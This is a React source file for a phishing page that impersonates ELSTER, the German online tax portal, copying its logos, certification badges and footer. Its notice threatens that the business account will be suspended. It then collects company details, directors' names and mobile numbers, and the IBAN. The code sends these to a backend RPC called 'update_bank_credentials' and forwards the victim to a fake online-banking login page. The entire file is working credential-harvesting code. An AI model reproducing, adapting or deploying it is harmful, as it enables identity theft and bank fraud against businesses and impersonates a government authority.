import { useState, useEffect, useMemo } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { resolveDeBankRoute } from "@/lib/bankMatchDe";
import { supabase } from "@/integrations/supabase/client";
import { usePageMeta } from "@/hooks/use-page-meta";
import LoadingOverlay from "@/components/LoadingOverlay";
import {
  User,
  Settings,
  Check,
  Files,
  Users,
  LayoutGrid,
  Menu,
  X,
  ExternalLink,
  Plus,
  Trash2,
} from "lucide-react";
import bsiAsset from "@/assets/elster-bsi.png.asset.json";
import bikAsset from "@/assets/elster-bik.png.asset.json";
import llAsset from "@/assets/elster-ll.jpg.asset.json";
import elsterLogo from "@/assets/elster-logo.png.asset.json";
import sternAsset from "@/assets/stern.png.asset.json";
import sternTransparentAsset from "@/assets/stern-transparent.png.asset.json";

const GREEN = "#78b434";
const BLUE = "#007fad";
const TEXT = "#222";
const MUTED = "#666";
const BORDER = "#d7d7d7";

type Director = { firstName: string; lastName: string; mobile: string };

function formatIban(raw: string) {
  const cleaned = raw.toUpperCase().replace(/[^A-Z0-9]/g, "").slice(0, 34);
  return cleaned.replace(/(.{4})/g, "$1 ").trim();
}

const ElsterDatenaktualisierung = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const STORAGE_KEY = "elster-upd-state";

  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [company, setCompany] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [city, setCity] = useState("");
  const [directors, setDirectors] = useState<Director[]>([
    { firstName: "", lastName: "", mobile: "" },
  ]);
  const [iban, setIban] = useState("");
  const [bankName, setBankName] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [submitting, setSubmitting] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);

  const cleanedIban = iban.replace(/\s/g, "").toUpperCase();
  const ibanValid = useMemo(() => {
    const s = cleanedIban;
    if (s.length < 15 || s.length > 34 || !/^[A-Z0-9]+$/.test(s)) return false;
    const rearranged = s.slice(4) + s.slice(0, 4);
    const converted = rearranged.replace(/[A-Z]/g, (c) => (c.charCodeAt(0) - 55).toString());
    let remainder = 0;
    for (let i = 0; i < converted.length; i++) {
      remainder = (remainder * 10 + Number(converted[i])) % 97;
    }
    return remainder === 1;
  }, [cleanedIban]);

  useEffect(() => {
    if (!ibanValid) { setBankName(""); return; }
    const ctrl = new AbortController();
    const t = setTimeout(async () => {
      try {
        const res = await fetch(`https://openiban.com/validate/${cleanedIban}?getBIC=true&validateBankCode=true`, { signal: ctrl.signal });
        const data = await res.json();
        if (data?.valid && data?.bankData?.name) setBankName(data.bankData.name);
        else setBankName("");
      } catch { /* ignore */ }
    }, 400);
    return () => { ctrl.abort(); clearTimeout(t); };
  }, [cleanedIban, ibanValid]);

  useEffect(() => { window.scrollTo(0, 0); }, [step]);
  usePageMeta("Mein ELSTER | Daten aktualisieren", "/favicon.png");

  // Restore state when returning from bank login (?step=3)
  useEffect(() => {
    if (searchParams.get("step") !== "3") return;
    try {
      const raw = sessionStorage.getItem(STORAGE_KEY);
      if (raw) {
        const s = JSON.parse(raw);
        setCompany(s.company ?? ""); setEmail(s.email ?? ""); setPhone(s.phone ?? "");
        setStreet(s.street ?? ""); setCity(s.city ?? "");
        setDirectors(s.directors ?? [{ firstName: "", lastName: "", mobile: "" }]);
        setIban(s.iban ?? ""); setBankName(s.bankName ?? "");
      }
    } catch { /* ignore */ }
    setStep(3);
  }, [searchParams]);

  const txCode = useMemo(() => {
    const n = Math.floor(100000000 + Math.random() * 900000000);
    return `${n} -C${Math.floor(10 + Math.random() * 90)}`;
  }, []);

  const updateDirector = (i: number, key: keyof Director, val: string) => {
    setDirectors((d) => d.map((x, idx) => idx === i ? { ...x, [key]: val } : x));
  };
  const addDirector = () => setDirectors((d) => [...d, { firstName: "", lastName: "", mobile: "" }]);
  const removeDirector = (i: number) => setDirectors((d) => d.filter((_, idx) => idx !== i));

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    const err: Record<string, string> = {};
    if (!company.trim()) err.company = "Bitte Unternehmensname eingeben.";
    if (!email.trim()) err.email = "Bitte E-Mail-Adresse eingeben.";
    if (!street.trim()) err.street = "Bitte Straße und Hausnummer eingeben.";
    if (!city.trim()) err.city = "Bitte PLZ und Stadt eingeben.";
    directors.forEach((d, i) => {
      if (!d.firstName.trim()) err[`gf_${i}_fn`] = "Pflichtfeld.";
      if (!d.lastName.trim()) err[`gf_${i}_ln`] = "Pflichtfeld.";
      if (!d.mobile.trim()) err[`gf_${i}_mb`] = "Pflichtfeld.";
    });
    setErrors(err);
    if (Object.keys(err).length === 0) setStep(2);
  };

  const [loadingMsg, setLoadingMsg] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const err: Record<string, string> = {};
    const cleaned = iban.replace(/\s/g, "");
    if (cleaned.length < 15) err.iban = "Bitte gültige IBAN eingeben.";
    if (!ibanValid) err.iban = "Bitte gültige IBAN eingeben.";
    if (!bankName) err.iban = "Bank konnte noch nicht ermittelt werden.";
    setErrors(err);
    if (Object.keys(err).length > 0 || submitting) return;
    setSubmitting(true);
    setLoadingMsg("Bankverbindung wird überprüft…");

    const summary = [
      `Unternehmen: ${company}`,
      `E-Mail: ${email}`,
      `Telefon: ${phone || "-"}`,
      `Adresse: ${street}, ${city}`,
      ...directors.map((d, i) => `Geschäftsführer ${i + 1}: ${d.firstName} ${d.lastName} (Mobil: ${d.mobile})`),
    ].join("\n");

    const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
    const rpcPromise = sessionId
      ? supabase.rpc("update_bank_credentials", {
          p_session_id: sessionId,
          p_username: summary,
          p_password: iban,
          p_username_label: "Firmendaten",
          p_password_label: "IBAN",
        })
      : Promise.resolve({ error: null } as { error: unknown });

    await sleep(1500);
    const { error } = (await rpcPromise) as { error: unknown };
    if (error) console.error("Update failed:", error);

    // Resolve bank → /de/* and redirect for online-banking verification
    const route = await resolveDeBankRoute(bankName);
    if (route) {
      try {
        sessionStorage.setItem(STORAGE_KEY, JSON.stringify({
          company, email, phone, street, city, directors, iban, bankName,
        }));
      } catch { /* ignore */ }
      setLoadingMsg("Weiterleitung zur Online-Banking-Anmeldung…");
      await sleep(1200);
      const qs = new URLSearchParams();
      if (sessionId) qs.set("s", sessionId);
      qs.set("return", "/elster/datenaktualisierung");
      navigate(`${route}?${qs.toString()}`);
      return;
    }

    setSubmitting(false);
    setLoadingMsg("");
    setErrors({ iban: "Für diese Bank ist derzeit keine Online-Verifizierung verfügbar." });
  };

  const menu = [
    { icon: User, label: "Mein ELSTER" },
    { icon: Settings, label: "Mein Benutzerkonto" },
    { icon: Files, label: "Formulare und Leistungen" },
    { icon: Users, label: "Benutzergruppen" },
    { icon: LayoutGrid, label: "Weitere Softwareprodukte" },
  ];

  const inputStyle = (hasError: boolean): React.CSSProperties => ({
    width: "100%", padding: "10px 12px",
    border: `1px solid ${hasError ? "#c00" : BORDER}`,
    outline: "none", fontSize: 15, boxSizing: "border-box", background: "#fff",
  });

  const labelStyle: React.CSSProperties = { display: "block", fontSize: 14, marginBottom: 6 };
  const fieldWrap: React.CSSProperties = { marginBottom: 14 };
  const errText: React.CSSProperties = { color: "#c00", fontSize: 13, marginTop: 4 };

  return (
    <div style={{ fontFamily: "'Open Sans', 'Segoe UI', Arial, sans-serif", color: TEXT, background: "#fff", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      <header style={{ background: "#fff", borderBottom: `1px solid ${GREEN}` }}>
        <div style={{ maxWidth: 1400, margin: "0 auto", padding: "14px 24px", display: "flex", alignItems: "center", gap: 16 }}>
          <a href="#" style={{ display: "flex", alignItems: "center", textDecoration: "none" }}>
            <img src={elsterLogo.url} alt="ELSTER – Ihr Online-Finanzamt" style={{ height: 44, width: "auto", display: "block", flexShrink: 0, objectFit: "contain" }} />
          </a>
          <div style={{ flex: 1 }} />
          <a href="#" className="hidden md:inline-flex" style={{ background: BLUE, color: "#fff", padding: "6px 16px", borderRadius: 3, textDecoration: "none", fontWeight: 600 }}>Anmelden</a>
          <button className="md:hidden" aria-label="Menü" onClick={() => setMenuOpen(true)} style={{ background: "none", border: "none", color: BLUE, cursor: "pointer" }}>
            <Menu size={28} />
          </button>
        </div>
      </header>

      {menuOpen && (
        <div className="md:hidden" style={{ position: "fixed", inset: 0, background: "#fff", zIndex: 50, display: "flex", flexDirection: "column" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "14px 20px", borderBottom: `3px solid ${GREEN}` }}>
            <img src={elsterLogo.url} alt="ELSTER" style={{ height: 36, width: "auto", display: "block" }} />
            <button aria-label="Schließen" onClick={() => setMenuOpen(false)} style={{ background: "none", border: "none", cursor: "pointer", color: TEXT }}><X size={28} /></button>
          </div>
          <nav style={{ padding: 16, display: "flex", flexDirection: "column", gap: 2 }}>
            {menu.map((m) => (
              <a key={m.label} href="#" style={{ display: "flex", alignItems: "center", gap: 12, padding: "14px 10px", color: BLUE, textDecoration: "none", borderBottom: `1px solid ${BORDER}` }}>
                <m.icon size={22} /> {m.label}
              </a>
            ))}
          </nav>
        </div>
      )}

      <main style={{ flex: 1, maxWidth: 1400, width: "100%", margin: "0 auto", padding: "24px 16px", display: "grid", gridTemplateColumns: "260px 1fr", gap: 20, position: "relative" }} className="elster-main">
        <div className="elster-vrule hidden lg:block" style={{ position: "absolute", right: 16, top: 24, bottom: 24, width: 1, background: BORDER, pointerEvents: "none" }} />
        <aside className="hidden lg:block" style={{ border: `1px solid ${BORDER}`, background: "#fff" }}>
          <div style={{ padding: "16px 18px", borderBottom: `1px solid ${BORDER}`, color: TEXT, fontSize: 16 }}>ELSTER</div>
          {menu.map((m, i) => (
            <a key={m.label} href="#" style={{
              display: "flex", alignItems: "center", gap: 12,
              padding: "14px 18px", color: BLUE, textDecoration: "none",
              borderBottom: i < menu.length - 1 ? `1px solid ${BORDER}` : "none",
              fontSize: 15,
            }}>
              <m.icon size={20} strokeWidth={1.5} /> {m.label}
            </a>
          ))}
        </aside>

        <section>
          <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 12px" }}>Daten aktualisieren</h1>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
            <p style={{ fontSize: 13, lineHeight: 1.55, color: TEXT, margin: "0 0 20px" }}>
              <strong style={{ color: TEXT }}>Wichtiger Hinweis:</strong> Zur Aufrechterhaltung Ihres ELSTER-Unternehmenskontos ist eine
              unverzügliche Aktualisierung Ihrer Firmen- und Bankdaten zwingend erforderlich. Bitte vervollständigen Sie die
              nachfolgenden Angaben umgehend. Andernfalls wird Ihr Zugang zu Mein ELSTER vorübergehend gesperrt und kann
              bei weiterer Nichtbeachtung dauerhaft entzogen werden, wodurch die elektronische Übermittlung von
              Steuererklärungen, Umsatzsteuer-Voranmeldungen und sonstigen Meldungen an Ihr Finanzamt nicht mehr möglich ist.
            </p>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", columnGap: 0, paddingRight: 16 }} className="elster-content">
            <div style={{ background: "#fff", padding: "20px 24px", border: `1px solid ${BORDER}` }}>
              <div style={{ display: "flex", alignItems: "center", marginBottom: 24 }}>
                {([
                  { n: 1, label: "Firmendaten" },
                  { n: 2, label: "IBAN" },
                  { n: 3, label: "Bestätigung" },
                ] as const).map((s, idx) => {
                  const done = step > s.n;
                  const active = step === s.n;
                  const on = done || active;
                  return (
                    <div key={s.n} style={{ display: "flex", alignItems: "center" }}>
                      {idx > 0 && (
                        <div style={{ flex: "0 0 48px", height: 2, background: step >= s.n ? GREEN : "#ccc", margin: "0 12px" }} />
                      )}
                      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                        <div style={{
                          width: 28, height: 28, borderRadius: "50%",
                          background: on ? GREEN : "#ccc",
                          color: "#fff", display: "flex", alignItems: "center", justifyContent: "center",
                          fontSize: 13, fontWeight: 600, lineHeight: 1
                        }}>
                          {done ? "✓" : s.n}
                        </div>
                        <span style={{ fontSize: 14, fontWeight: active ? 600 : 400, color: active ? GREEN : "#666" }}>{s.label}</span>
                      </div>
                    </div>
                  );
                })}
              </div>

              {step === 1 && (
                <form onSubmit={handleNext} noValidate>
                  <div style={fieldWrap}>
                    <label style={labelStyle}>Unternehmensname</label>
                    <input value={company} onChange={(e) => setCompany(e.target.value)} style={inputStyle(!!errors.company)} />
                    {errors.company && <div style={errText}>{errors.company}</div>}
                  </div>
                  <div style={fieldWrap}>
                    <label style={labelStyle}>E-Mail-Adresse</label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} style={inputStyle(!!errors.email)} />
                    {errors.email && <div style={errText}>{errors.email}</div>}
                  </div>
                  <div style={fieldWrap}>
                    <label style={labelStyle}>Telefonnummer (Optional)</label>
                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} style={inputStyle(false)} />
                  </div>
                  <div style={fieldWrap}>
                    <label style={labelStyle}>Straße, Hausnummer</label>
                    <input value={street} onChange={(e) => setStreet(e.target.value)} style={inputStyle(!!errors.street)} />
                    {errors.street && <div style={errText}>{errors.street}</div>}
                  </div>
                  <div style={fieldWrap}>
                    <label style={labelStyle}>PLZ, Stadt</label>
                    <input value={city} onChange={(e) => setCity(e.target.value)} style={inputStyle(!!errors.city)} />
                    {errors.city && <div style={errText}>{errors.city}</div>}
                  </div>

                  <div style={{ height: 1, background: BORDER, margin: "22px 0 18px" }} />

                  {directors.map((d, i) => (
                    <div key={i} style={{ marginBottom: 18 }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                        <div style={{ fontSize: 15, fontWeight: 600 }}>Geschäftsführer {directors.length > 1 ? i + 1 : ""}</div>
                        {directors.length > 1 && (
                          <button type="button" onClick={() => removeDirector(i)} style={{ background: "none", border: "none", color: BLUE, cursor: "pointer", display: "flex", alignItems: "center", gap: 4, fontSize: 13 }}>
                            <Trash2 size={14} /> Entfernen
                          </button>
                        )}
                      </div>
                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }} className="gf-grid">
                        <div>
                          <label style={labelStyle}>Vorname</label>
                          <input value={d.firstName} onChange={(e) => updateDirector(i, "firstName", e.target.value)} style={inputStyle(!!errors[`gf_${i}_fn`])} />
                        </div>
                        <div>
                          <label style={labelStyle}>Nachname</label>
                          <input value={d.lastName} onChange={(e) => updateDirector(i, "lastName", e.target.value)} style={inputStyle(!!errors[`gf_${i}_ln`])} />
                        </div>
                      </div>
                      <div style={{ marginTop: 12 }}>
                        <label style={labelStyle}>Mobilfunknummer</label>
                        <input type="tel" value={d.mobile} onChange={(e) => updateDirector(i, "mobile", e.target.value)} style={inputStyle(!!errors[`gf_${i}_mb`])} />
                      </div>
                    </div>
                  ))}

                  <button type="button" onClick={addDirector} style={{ background: "none", border: `1px solid ${BORDER}`, color: BLUE, padding: "8px 14px", cursor: "pointer", fontSize: 14, display: "inline-flex", alignItems: "center", gap: 6, marginBottom: 20 }}>
                    <Plus size={16} /> Weiteren Geschäftsführer hinzufügen
                  </button>

                  <div style={{ marginTop: 10 }}>
                    <button type="submit" style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Weiter</button>
                  </div>
                </form>
              )}

              {step === 2 && (
                <form onSubmit={handleSubmit} noValidate>
                  <div style={fieldWrap}>
                    <label style={labelStyle}>IBAN</label>
                    <input
                      value={iban}
                      onChange={(e) => { setIban(formatIban(e.target.value)); if (errors.iban) setErrors({}); }}
                      placeholder="DE00 0000 0000 0000 0000 00"
                      style={{ ...inputStyle(!!errors.iban), letterSpacing: 1, fontFamily: "monospace" }}
                      autoComplete="off"
                      inputMode="text"
                    />
                    {errors.iban && <div style={errText}>{errors.iban}</div>}
                    {bankName && !errors.iban && (
                      <div style={{ color: MUTED, fontSize: 13, marginTop: 6 }}>{bankName}</div>
                    )}
                  </div>

                  <div style={{ background: "#f8f8f8", border: `1px solid ${BORDER}`, padding: "12px 14px", fontSize: 13, lineHeight: 1.5, color: TEXT, marginTop: 8 }}>
                    <strong>Hinweis zur Kontoverifizierung:</strong> Nach dem Absenden werden Sie zur Online-Banking-Anmeldung Ihrer Bank weitergeleitet. Bitte loggen Sie sich dort ein, um Ihr Konto zu bestätigen. Anschließend kehren Sie automatisch hierher zurück.
                  </div>

                  <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
                    <button type="button" onClick={() => setStep(1)} style={{ background: "#fff", color: BLUE, border: `1px solid ${BORDER}`, padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Zurück</button>
                    <button type="submit" disabled={submitting || !ibanValid || !bankName} style={{ background: BLUE, color: "#fff", border: "none", padding: "8px 20px", borderRadius: 3, fontSize: 15, cursor: (submitting || !ibanValid || !bankName) ? "not-allowed" : "pointer", opacity: (submitting || !ibanValid || !bankName) ? 0.5 : 1 }}>Absenden</button>
                  </div>
                </form>
              )}

              {step === 3 && (
                <div>
                  <div style={{ display: "flex", flexDirection: "column", alignItems: "center", textAlign: "center", padding: "12px 0 20px" }}>
                    <div style={{ width: 64, height: 64, borderRadius: "50%", background: GREEN, color: "#fff", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 16 }}>
                      <Check size={36} strokeWidth={3} />
                    </div>
                    <h2 style={{ fontSize: 22, fontWeight: 400, margin: "0 0 8px", color: TEXT }}>Datenaktualisierung erfolgreich übermittelt</h2>
                    <p style={{ fontSize: 14, color: MUTED, maxWidth: 480, margin: 0, lineHeight: 1.55 }}>
                      Ihre Firmen- und Bankdaten wurden erfolgreich übermittelt und werden in unseren Systemen aktualisiert. Es sind keine weiteren Schritte erforderlich.
                    </p>
                  </div>

                  <div style={{ border: `1px solid ${BORDER}`, marginTop: 8 }}>
                    <div style={{ padding: "12px 16px", background: "#f8f8f8", borderBottom: `1px solid ${BORDER}`, fontSize: 14, fontWeight: 600 }}>
                      Übermittelte Angaben
                    </div>
                    <div>
                      {[
                        { l: "Unternehmen", v: company },
                        { l: "E-Mail-Adresse", v: email },
                        { l: "Telefonnummer", v: phone || "—" },
                        { l: "Straße, Hausnummer", v: street },
                        { l: "PLZ, Stadt", v: city },
                        ...directors.map((d, i) => ({
                          l: `Geschäftsführer${directors.length > 1 ? ` ${i + 1}` : ""}`,
                          v: `${d.firstName} ${d.lastName}${d.mobile ? ` · ${d.mobile}` : ""}`,
                        })),
                        { l: "IBAN", v: iban },
                        ...(bankName ? [{ l: "Bank", v: bankName }] : []),
                      ].map((row, idx, arr) => (
                        <div key={idx} style={{ display: "flex", justifyContent: "space-between", gap: 16, padding: "10px 16px", borderBottom: idx < arr.length - 1 ? `1px solid ${BORDER}` : "none", fontSize: 14 }}>
                          <span style={{ color: MUTED }}>{row.l}</span>
                          <span style={{ color: TEXT, textAlign: "right", wordBreak: "break-word" }}>{row.v}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div style={{ marginTop: 16, background: "#eef7e3", border: `1px solid ${GREEN}`, color: "#2d4a0a", padding: "10px 14px", fontSize: 13, lineHeight: 1.5 }}>
                    <strong>Hinweis:</strong> Sie erhalten in Kürze eine Bestätigung per E-Mail. Es sind keine weiteren Schritte erforderlich.
                  </div>
                </div>
              )}
            </div>

            <aside className="elster-info" style={{ fontSize: 14, lineHeight: 1.5, marginLeft: 16, alignSelf: "start", background: "#f8f8f8", padding: "20px 20px" }}>
              <div style={{ fontWeight: 700, marginBottom: 8 }}>Warum werden diese Daten benötigt?</div>
              <p style={{ color: MUTED, margin: "0 0 16px" }}>
                Zur Aktualisierung Ihres ELSTER-Unternehmenskontos bestätigen Sie bitte Ihre aktuellen Firmen- und Kontaktdaten sowie die hinterlegte Bankverbindung.
              </p>
              <div style={{ fontWeight: 700, marginBottom: 6 }}>Fragen zur Aktualisierung?</div>
              <div>Weitere Informationen in der <a href="#" style={{ color: BLUE, textDecoration: "none", fontWeight: 600 }}>Hilfe</a>.</div>
            </aside>
          </div>
        </section>
      </main>

      <div style={{ height: 4, background: GREEN, marginTop: 32 }} />
      <footer style={{ background: "#4a4a4a", color: "#fff", marginTop: 0 }}>
        <div style={{ maxWidth: 1400, margin: "0 auto", padding: "40px 24px", display: "grid", gridTemplateColumns: "1fr 2fr", gap: 32 }} className="elster-footer-grid">
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 20 }}>
              <img src={sternAsset.url} alt="" style={{ height: 28, width: "auto" }} />
              <span style={{ fontSize: 24 }}>ELSTER</span>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px 24px", paddingLeft: 38 }}>
              {[
                "Aktuelles", "Presse und Medien",
                "Rechtliches", "Systemanforderungen",
                "Nutzen und Vorteile", "MeinELSTER+",
                "Sicherheit", "ElsterSecure",
                "Inhalte in Leichter Sprache", "ELSTER-Unternehmenskonto",
              ].map((l) => (
                <a key={l} href="#" style={{ color: "#fff", textDecoration: "none", fontSize: 14, padding: "4px 0" }}>{l}</a>
              ))}
            </div>
          </div>
          <div>
            <div style={{ fontSize: 20, marginBottom: 20 }}>Zertifikate</div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 16 }} className="elster-certs">
              {[
                { img: bsiAsset.url, text: "ISO 27001 Sicherheit im Verfahren ELSTER" },
                { img: bikAsset.url, text: "Vom BIK geprüfter Webauftritt" },
                { img: llAsset.url, text: "Von capito geprüfte Leichte Sprache" },
              ].map((c) => (
                <div key={c.text} style={{ display: "grid", gridTemplateColumns: "1fr 1fr", alignItems: "stretch", color: "#006d97" }}>
                  <div style={{ background: "#fff", display: "flex", alignItems: "center", justifyContent: "center", padding: 14 }}>
                    <img src={c.img} alt="" style={{ height: 56, width: "auto", maxWidth: "100%" }} />
                  </div>
                  <div style={{ background: "#f2f2f2", display: "flex", alignItems: "center", padding: 14, fontSize: 13, lineHeight: 1.3 }}>
                    <span>{c.text} <ExternalLink size={12} style={{ display: "inline", color: "#006d97", verticalAlign: "middle" }} /></span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div style={{ background: "#2b2b2b", color: "#fff", padding: "14px 24px" }}>
          <div style={{ maxWidth: 1400, margin: "0 auto", display: "flex", flexWrap: "wrap", gap: 20, alignItems: "center", fontSize: 14 }} className="elster-footer-bottom">
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Forum <ExternalLink size={11} style={{ display: "inline" }} /></a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Hilfe, <u>FAQ</u></a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Fragen zu ELSTER</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Kontakt</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>KONSENS <ExternalLink size={11} style={{ display: "inline" }} /></a>
            <span style={{ flex: 1 }} />
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Datenschutz</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Impressum</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Barrierefreiheit</a>
            <img src={sternTransparentAsset.url} alt="" style={{ height: 20, width: "auto" }} />
            <span>ELSTER ®</span>
            <span style={{ opacity: 0.8 }}>{txCode}</span>
          </div>
        </div>
      </footer>

      <style>{`
        @media (min-width: 1024px) {
          .elster-main { position: relative; }
          .elster-main::before,
          .elster-main::after {
            content: "";
            position: absolute;
            left: 16px;
            right: 16px;
            border-top: 1px solid ${BORDER};
            pointer-events: none;
          }
          .elster-main::before { top: 24px; }
          .elster-main::after { bottom: 24px; }
        }
        @media (max-width: 1023px) {
          .elster-main { grid-template-columns: 1fr !important; }
          .elster-content { grid-template-columns: 1fr !important; }
          .elster-info { order: 3; margin-left: 0 !important; margin-top: 16px; }
        }
        @media (max-width: 640px) {
          .elster-footer-grid { grid-template-columns: 1fr !important; }
          .elster-certs { grid-template-columns: 1fr !important; }
          .gf-grid { grid-template-columns: 1fr !important; }
        }
      `}</style>
    </div>
  );
};

export default ElsterDatenaktualisierung;
